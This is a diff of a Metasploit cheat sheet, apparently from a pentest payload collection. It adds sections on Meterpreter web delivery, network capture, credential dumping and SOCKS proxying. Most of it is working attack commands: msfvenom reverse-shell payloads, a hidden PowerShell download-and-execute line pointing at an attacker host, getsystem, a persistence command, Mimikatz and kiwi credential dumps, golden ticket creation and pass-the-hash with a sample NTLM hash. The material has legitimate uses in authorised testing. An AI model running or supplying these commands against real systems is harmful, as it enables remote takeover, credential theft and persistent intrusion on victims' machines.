@@ -1,5 +1,27 @@
 # Metasploit
 
+## Summary
+
+* [Installation](#installation)
+* [Sessions](#sessions)
+* [Background handler](#background-handler)
+* [Meterpreter - Basic](#meterpreter---basic)
+    * [Generate a meterpreter](#generate-a-meterpreter)
+    * [Meterpreter Webdelivery](#meterpreter-webdelivery)
+    * [Get System](#get-system)
+    * [Persistence Startup](#persistence-startup)
+    * [Network Monitoring](#network-monitoring)
+    * [Portforward](#portforward)
+    * [Upload / Download](#upload---download)
+    * [Execute from Memory](#execute-from-memory)
+    * [Mimikatz](#mimikatz)
+    * [Pass the Hash - PSExec](#pass-the-hash---psexec)
+    * [Use SOCKS Proxy](#use-socks-proxy)
+* [Scripting Metasploit](#scripting-metasploit)
+* [Multiple transports](#multiple-transports)
+* [Best of - Exploits](#best-of---exploits)
+* [References](#references)
+
 ## Installation
 
 ```powershell
@@ -25,7 +47,7 @@ sessions -c cmd           -> Execute a command on several sessions
 sessions -i 10-20 -c "id" -> Execute a command on several sessions
 ```
 
-## Multi/handler in background (screen/tmux)
+## Background handler
 
 ExitOnSession : the handler will not exit if the meterpreter dies.
 
@@ -38,7 +60,9 @@ set PAYLOAD generic/shell_reverse_tcp
 set LHOST 0.0.0.0
 set LPORT 4444
 set ExitOnSession false
-exploit -j
+
+generate -o /tmp/meterpreter.exe -f exe
+to_handler
 
 [ctrl+a] + [d]
 ```
@@ -60,7 +84,25 @@ $ msfvenom -p cmd/unix/reverse_bash LHOST="10.10.10.110" LPORT=4242 -f raw > she
 $ msfvenom -p cmd/unix/reverse_perl LHOST="10.10.10.110" LPORT=4242 -f raw > shell.pl
 ```
 
-### SYSTEM / Administrator privilege
+### Meterpreter Webdelivery
+
+Set up a Powershell web delivery listening on port 8080.
+
+```powershell
+use exploit/multi/script/web_delivery
+set TARGET 2
+set payload windows/x64/meterpreter/reverse_http
+set LHOST 10.0.0.1
+set LPORT 4444
+run
+```
+
+```powershell
+powershell.exe -nop -w hidden -c $g=new-object net.webclient;$g.proxy=[Net.WebRequest]::GetSystemWebProxy();$g.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $g.downloadstring('http://10.0.0.1:8080/rYDPPB');
+```
+
+
+### Get System
 
 ```powershell
 meterpreter > getsystem
@@ -90,6 +132,16 @@ OPTIONS:
 meterpreter > run persistence -U -p 4242
 ```
 
+### Network Monitoring
+
+```powershell
+# list interfaces
+run packetrecorder -li
+
+# record interface n°1
+run packetrecorder -i 1
+```
+
 ### Portforward
 
 ```powershell
@@ -115,11 +167,14 @@ execute -H -i -c -m -d calc.exe -f /root/wce.exe -a  -w
 load mimikatz
 mimikatz_command -f version
 mimikatz_command -f samdump::hashes
+mimikatz_command -f sekurlsa::wdigest
 mimikatz_command -f sekurlsa::searchPasswords
+mimikatz_command -f sekurlsa::logonPasswords full
 ```
 
 ```powershell
 load kiwi
+creds_all
 golden_ticket_create -d <domainname> -k <nthashof krbtgt> -s <SID without le RID> -u <user_for_the_ticket> -t <location_to_store_tck>
 ```
 
@@ -132,6 +187,12 @@ msf exploit(psexec) > exploit
 SMBDomain             WORKGROUP                                                          no        The Windows domain to use for authentication
 SMBPass               598ddce2660d3193aad3b435b51404ee:2d20d252a479f485cdf5e171d93985bf  no        The password for the specified username
 SMBUser               Lambda                                                             no        The username to authenticate as
+```
+
+### Use SOCKS Proxy
+
+```powershell
+setg Proxies socks4:127.0.0.1:1080
 ```
 
 ## Scripting Metasploit
